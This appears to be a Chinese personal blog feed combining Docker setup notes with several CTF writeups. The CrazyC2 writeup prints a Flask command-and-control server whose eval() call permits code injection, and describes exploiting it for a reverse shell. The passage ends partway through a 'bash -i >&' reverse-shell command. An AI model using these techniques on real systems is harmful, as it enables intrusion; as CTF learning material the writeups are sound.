      <url>/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用到哪里写到哪里吧，随着使用的深入以后还会更新这篇文章</p></blockquote><p>参考文章传送门：</p><p><a href="https://blog.csdn.net/u012563853/article/details/125295985?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172148665016800188528574%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172148665016800188528574&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125295985-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%20docker&spm=1018.2226.3001.4187">文章一</a>，<a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172136879616800211563088%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172136879616800211563088&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=docker&spm=1018.2226.3001.4187">文章二</a>，<a href="https://blog.csdn.net/jsnhux/article/details/89847109">文章三</a>，<a href="https://www.runoob.com/docker/docker-dockerfile.html">文章四</a></p><h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><h3 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h3><p>Docker是一个可以用来装web应用的容器。Docker这个词的本义是码头工人，主要工作就是搬运那些“集装箱”，将它们搬运到相应的目的地去。Docker拥有着一个“超级码头”，或者说一个巨大的物流中心，我们可以把我们的“集装箱”push到这个超级码头去，以便我们在另一个码头时可以将它直接pull过来，而不是就地复刻一个曾经我们拥有过的集装箱。</p><p>有些文章中会拿docker和虚拟机作对比，深入而又透彻，什么使用了LXC技术，不需要HyperV转换之类的，这里我就不再赘述了，总结来说就是docker容器更为轻量，运行起来更为快速。</p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>镜像，英文image，也就是上面我们提到的”集装箱“，我们的那个”超级码头“也就是镜像源。镜像的联合文件系统我也不再在这里赘述，感兴趣可以自行跳入上面的传送门去了解。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器，英文名container，可以理解为镜像的实例化。镜像是不可编辑的，容器是可以编辑的。我们可以用一个镜像生成多个容器。容器与容器之间互不干扰。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>说明：笔者电脑系统为Ubuntu 24.04 LTS，下面的操作都在root权限下进行</p><h3 id="卸载旧版"><a href="#卸载旧版" class="headerlink" title="卸载旧版"></a>卸载旧版</h3><p>如果以前安装过，那么先卸载一下旧版docker，没有则无需卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="写入软件源"><a href="#写入软件源" class="headerlink" title="写入软件源"></a>写入软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h3 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装一些工具"><a href="#安装一些工具" class="headerlink" title="安装一些工具"></a>安装一些工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>重启一下docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h3 id="配置阿里云镜像加速器"><a href="#配置阿里云镜像加速器" class="headerlink" title="配置阿里云镜像加速器"></a>配置阿里云镜像加速器</h3><p>登录你的阿里云账号，<a href="https://dev.aliyun.com/">传送门</a></p><p>点左上角三条杠–容器–容器镜像服务ACR–镜像工具–镜像加速器</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240720234631745.png" alt="image-20240720234631745"></p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-07-20-234712.png" alt="屏幕截图 2024-07-20 234712"></p><p>网站上已经详细地说明了操作步骤，这里我还是将它一步一步分开说一下</p><p>&#x2F;etc&#x2F;docker应该是已经存在了，如果没有的话就用下面的命令去创建一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br></pre></td></tr></table></figure><p>在&#x2F;etc&#x2F;docker路径下创建一个叫daemon.json的文件，编辑其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://这里填上面给的地址.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新加载一下daemon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="测试安装是否成功"><a href="#测试安装是否成功" class="headerlink" title="测试安装是否成功"></a>测试安装是否成功</h3><p>我们先拉取一个hello-world的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果出现以下界面，则说明安装成功</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-00-11-44.png" alt="截图 2024-07-21 00-11-44"></p><h2 id="Docker简单命令"><a href="#Docker简单命令" class="headerlink" title="Docker简单命令"></a>Docker简单命令</h2><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure><p>删除本地镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><p>查看本地拥有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>用某一镜像开启一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名</span><br></pre></td></tr></table></figure><p>开启容器时在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure><p>查看当前运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>查看存在的容器（包括不在运行中的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>停止运行某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID（可通过上面的ps命令看到，可仅写ID的前几位）</span><br></pre></td></tr></table></figure><p>删除某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><p>进入某一容器，以bash界面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID bash</span><br></pre></td></tr></table></figure><p>想退出容器，则输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h2><p>说明：下文中客户端ip：192.168.3.18，服务端ip：192.168.3.25</p><p>这里简述一下如何在docker中跑一个对外的web服务，用nginx镜像举例</p><p>首先pull一下nginx的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-08-49.png" alt="截图-2024-07-21-14-08-49"></p><p>如果我们想让服务跑在服务端主机的11451端口，容器内跑在80端口，那么得用如下命令，在启动容器时做一个端口映射。<strong>注意记得开启服务端主机的11451端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 11451:80 nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-16-37.png" alt="截图-2024-07-21-14-16-37"></p><p>这里我们可以看一下这个容器的ID和运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-18-55.png" alt="截图-2024-07-21-14-18-55"></p><p>可以看到已经成功运行了。</p><p>此时我们就可以用客户端浏览器去访问服务端的11451端口了，如果看到如下页面，那么就说明成功了。</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240721142135086.png" alt="image-20240721142135086"></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。通过定义一系列命令和参数，Dockerfile 指导 Docker 构建一个自定义的镜像。</p><p>dockerfile中的指令及其作用：</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240809205825697.png" alt="image-20240809205825697"></p><p>要通过dockerfile构建镜像，首先切到dockerfile所在的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 自定义镜像名 .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 Writeup</title>
      <link href="/2024/06/01/LitCTF2024-Writeup/"/>
      <url>/2024/06/01/LitCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/LitCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024初赛 Misc</title>
      <link href="/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/"/>
      <url>/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一次X1cT34m前辈们的狂欢（竟然直接给干到第一了！！？），我只是做个misc给前辈们助助兴。。。</p></blockquote><h3 id="flag-video-version"><a href="#flag-video-version" class="headerlink" title="flag_video_version"></a>flag_video_version</h3><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202344.png)</p><p>从sdp.txt中得知视频通过RTP传输，编码方式为H264</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202557.png)</p><p>wireshark中Decode As RTP</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202921.png)</p><p>从RTP流分析中可以看出序列存在问题，将每一个分组对应的序列保存进2.txt</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 203245.png)</p><p>追踪UDP流，将传输的内容保存进1.txt</p><img src="/images/jqctf2024初赛-Misc/屏幕截图 2024-05-26 203444.png" alt="屏幕截图 2024-05-26 203444" style="zoom:50%;" /><p>写脚本将这些数据包按照正常的顺序拼接起来，最终保存为data.264</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">num=[]</span><br><span class="line">ls=[]</span><br><span class="line">a=f2.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(a):</span><br><span class="line">    num.append(<span class="built_in">int</span>(a))</span><br><span class="line">    a=f2.readline().strip()</span><br><span class="line">b=f1.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(b):</span><br><span class="line">    ls.append(b)</span><br><span class="line">    b=f1.readline().strip()</span><br><span class="line">sorted_ls = [x <span class="keyword">for</span> _, x <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(num, ls))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted_ls:</span><br><span class="line">    f3.write(i)</span><br><span class="line">    f3.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/jqctf2024%E5%88%9D%E8%B5%9B-Misc/image-20240526203853688.png"></p><p>用MilkPlayer播放这个视频，视频展示了flag</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 204143.png)</p><p>flag{ef051f0cd551650c8b6c9eac7b5ad861}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>flag{605379906}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 Writeup</title>
      <link href="/2024/05/19/CISCN2024-Writeup/"/>
      <url>/2024/05/19/CISCN2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="初赛Writeup"><a href="#初赛Writeup" class="headerlink" title="初赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup.pdf">初赛Writeup</a></h4><p>Additional Statement:</p><p>这是一次由四个大一新生组成的X2cT34m的奇妙冒险，</p><p>我参与做了crypto和一部分的misc</p><h4 id="华东北赛区赛Writeup"><a href="#华东北赛区赛Writeup" class="headerlink" title="华东北赛区赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup1.pdf">华东北赛区赛Writeup</a></h4><p>Additional Statement:</p><p>第一次打线下，AWDP模式。</p><p>太菜了，面对题目一脸懵（T0T）</p><p>但是听说是可以通过patch包传个马上去再攻击的（？？！），比赛时我们队虽然想到了但是没去试，还是打保守了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 Writeup</title>
      <link href="/2024/04/29/2024-04-29-XYCTF2024-Writeup/"/>
      <url>/2024/04/29/2024-04-29-XYCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://f4k3r.top/pdf_file/XYCTF2024%20%E5%88%AB%E7%AE%A1%20Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>f4k3r</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 CrazyC2</title>
      <link href="/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/"/>
      <url>/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本来在CTF中应该都是基操，但是因为本人太菜，弄了好几天才出。。。（T0T）</p></blockquote><p>题目</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165312088.png" alt="image-20240402165312088"></p><p>先是流量分析，看到了很多TCP和HTTP流，追踪大概看一下</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164740735.png" alt="image-20240402164740735"></p><p>看起来传输了很多加密的信息，先把它们全都手动整理出来</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164916818.png" alt="image-20240402164916818"></p><p>直接解base64解不出，但是POST传参时看到了一个random_key，猜是异或用的，果然</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165223751.png" alt="image-20240402165223751"></p><p>看到用curl从攻击机读取了一个文件，我也试着读了一下，发现可以从攻击机中读到任意文件，于是读到了第一个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165620146.png" alt="image-20240402165620146"></p><p>从读一些不存在的文件产生的报错中可以看到python flask源码，读下来进行审计</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165819762.png" alt="image-20240402165819762"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">clients = &#123;<span class="string">&quot;4ace608657cba629&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;random_key&quot;</span>: <span class="number">95</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/init&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    client_id = secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    random_key = secrets.randbelow(<span class="number">255</span>)</span><br><span class="line">    clients[client_id] = &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;echo hello&quot;</span>, <span class="string">&quot;random_key&quot;</span>: random_key&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;client_id&quot;</span>: client_id, <span class="string">&quot;random_key&quot;</span>: random_key&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/recv&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(client_id, data[<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    command = clients[client_id].get(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    encrypted_command = encrypt_command(</span><br><span class="line">        command, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;encrypted_command&quot;</span>: encrypted_command&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/send&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(data[<span class="string">&quot;random_key&quot;</span>]) != clients[client_id][<span class="string">&quot;random_key&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;data error&quot;</span>, <span class="number">200</span></span><br><span class="line">    encrypted_data = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    decrypted_data = decrypt_data(</span><br><span class="line">        encrypted_data, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;decrypted_data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Received data&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/files&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_file</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    random_key = data[<span class="string">&quot;random_key&quot;</span>]</span><br><span class="line">    path = data[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_id <span class="keyword">not</span> <span class="keyword">in</span> clients.keys():</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid client_id&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> clients[client_id][<span class="string">&quot;random_key&quot;</span>] == <span class="built_in">int</span>(random_key):</span><br><span class="line">        <span class="keyword">return</span> send_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;incorrect random_key&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_command</span>(<span class="params">command, key</span>):</span><br><span class="line">    encrypted_data = xor(command, key)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b64decode(encrypted_data)</span><br><span class="line">    <span class="keyword">return</span> xor(encrypted_data, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">1337</span>, use_reloader=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_thread = Thread(target=run_flask_app)</span><br><span class="line">    flask_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> client_id <span class="keyword">in</span> clients.keys():</span><br><span class="line">            clients[client_id][<span class="string">&quot;command&quot;</span>] = command</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Executing: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到在判断random_key是否正确的地方存在一个我们CTFer最喜欢的eval，于是可以通过这个漏洞执行RCE</p><p>反弹shell拿下C2服务器</p><p>给攻击机传bash -c “bash -i &gt;&amp; 